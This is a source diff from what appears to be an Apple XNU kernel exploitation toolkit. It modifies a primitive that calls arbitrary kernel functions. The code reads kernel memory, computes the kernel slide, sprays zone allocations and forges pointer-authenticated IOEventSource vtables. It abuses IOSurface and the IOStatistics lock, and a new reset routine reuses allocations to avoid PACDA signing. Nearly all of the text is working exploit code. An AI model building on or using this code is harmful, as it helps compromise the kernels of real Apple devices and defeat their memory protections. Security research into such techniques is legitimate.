@@ -97,15 +97,12 @@ xe_util_kfunc_t xe_util_kfunc_create(uint free_zone_idx) {
     xe_util_zalloc_t io_event_source_allocator = xe_util_zalloc_create(xe_kmem_read_uint64(xe_slider_kernel_slide(VAR_ZONE_IO_EVENT_SOURCE), 0), 1);
     xe_util_zalloc_t reserved_allocator = xe_util_zalloc_create(xe_kmem_read_uint64(xe_slider_kernel_slide(VAR_ZONE_IO_EVENT_SOURCE_RESERVED), 0), 1);
     xe_util_zalloc_t counter_allocator = xe_util_zalloc_create(xe_kmem_read_uint64(xe_slider_kernel_slide(VAR_ZONE_IO_EVENT_SOURCE_COUNTER), 0), 1);
-    xe_util_zalloc_t block_allocator = xe_util_zalloc_create(xe_util_kh_find_zone_for_size(xe_slider_kernel_slide(VAR_KHEAP_DEFAULT_ADDR), sizeof(struct arm_context)), 1);
+    xe_util_zalloc_t block_allocator = xe_util_zalloc_create(xe_util_kh_find_zone_for_size(xe_slider_kernel_slide(VAR_KHEAP_DEFAULT_ADDR), 16384), 2);
     
-    sleep(1);
-    
-    uintptr_t io_event_source = xe_util_zalloc_alloc(io_event_source_allocator);
-    uintptr_t reserved = xe_util_zalloc_alloc(reserved_allocator);
-    xe_assert_cond(xe_util_zalloc_z_elem_size(block_allocator), >=, sizeof(struct arm_context));
-    uintptr_t block = xe_util_zalloc_alloc(block_allocator);
-    uintptr_t counter = xe_util_zalloc_alloc(counter_allocator);
+    uintptr_t io_event_source = xe_util_zalloc_alloc(io_event_source_allocator, 0);
+    uintptr_t reserved = xe_util_zalloc_alloc(reserved_allocator, 0);
+    uintptr_t block = xe_util_zalloc_alloc(block_allocator, 0);
+    uintptr_t counter = xe_util_zalloc_alloc(counter_allocator, 0);
     
     uintptr_t io_event_source_vtable = xe_util_kfunc_sign_address(proc, xe_slider_kernel_slide(VAR_IO_EVENT_SOURCE_VTABLE + 0x10), io_event_source, TYPE_IO_EVENT_SOURCE_MEM_VTABLE_DESCRIMINATOR);
     
@@ -217,9 +214,23 @@ int xe_util_kfunc_find_target_thread(uintptr_t proc, uintptr_t* ptr_out) {
 }
 
 
+void xe_util_kfunc_reset(xe_util_kfunc_t util) {
+    // Reuse the previous addresses to avoid signing pointers using PACDA
+    uintptr_t block = xe_util_zalloc_alloc(util->block_allocator, 0);
+    uintptr_t event_source = xe_util_zalloc_alloc(util->io_event_source_allocator, 0);
+    uintptr_t reserved = xe_util_zalloc_alloc(util->reserved_allocator, 0);
+    uintptr_t counter = xe_util_zalloc_alloc(util->counter_allocator, 0);
+    
+    xe_assert_cond(block, ==, util->block);
+    xe_assert_cond(event_source, ==, util->io_event_source);
+    xe_assert_cond(reserved, ==, util->reserved);
+    xe_assert_cond(counter, ==, util->counter);
+}
+
+
 void xe_util_kfunc_exec(xe_util_kfunc_t util, uintptr_t target_func, uint64_t args[8]) {
     if (!xe_kmem_read_uint64(xe_slider_kernel_slide(VAR_G_IO_STATISTICS_LOCK), 0)) {
-        uintptr_t lock = xe_util_zalloc_alloc(util->block_allocator);
+        uintptr_t lock = xe_util_zalloc_alloc(util->block_allocator, 1);
         uintptr_t kheap_default = xe_slider_kernel_slide(VAR_KHEAP_DEFAULT_ADDR);
         uintptr_t kh_large_map = xe_kmem_read_uint64(kheap_default, TYPE_KALLOC_HEAP_MEM_KH_LARGE_MAP_OFFSET);
         xe_kmem_copy(lock, kh_large_map + TYPE_VM_MAP_MEM_LCK_RW_OFFSET, 16);
@@ -230,6 +241,7 @@ void xe_util_kfunc_exec(xe_util_kfunc_t util, uintptr_t target_func, uint64_t ar
     
     uintptr_t surface;
     IOSurfaceRef surface_ref = xe_io_surface_create(&surface);
+    xe_log_debug("created io_surface at %p\n", (void*)surface);
     IOSurfaceSetValue(surface_ref, CFSTR("xe_util_kfunc_key"), kCFBooleanTrue);
     
     xe_util_kfunc_setup_event_source(util);
@@ -306,6 +318,7 @@ void xe_util_kfunc_exec(xe_util_kfunc_t util, uintptr_t target_func, uint64_t ar
     
     xe_util_lck_rw_lock_done(&io_statistics_lock);
     dispatch_semaphore_wait(sem_surface_destroy, DISPATCH_TIME_FOREVER);
+    xe_util_kfunc_reset(util);
 }
 
 
